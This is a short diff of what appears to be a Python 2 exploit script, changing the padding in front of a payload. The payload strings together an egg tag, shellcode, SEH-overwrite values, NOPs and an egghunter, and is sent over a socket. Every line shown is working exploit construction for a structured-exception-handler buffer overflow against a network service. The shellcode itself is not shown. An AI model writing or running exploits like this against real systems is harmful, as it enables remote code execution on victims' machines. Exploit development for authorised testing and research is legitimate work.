@@ -95,7 +95,7 @@ shellcode = (
 
 # Shellcode length = 322 bytes
 # payload = "DaltDalt" + shellcode + nseh + seh + nops + eggh
-payload = "A" + "DaltDalt" + shellcode + nseh + seh + nops + eggh
+payload = "AA" + "DaltDalt" + shellcode + nseh + seh + nops + eggh
 socket.send(payload)
 d = socket.recv(1024)
 print d
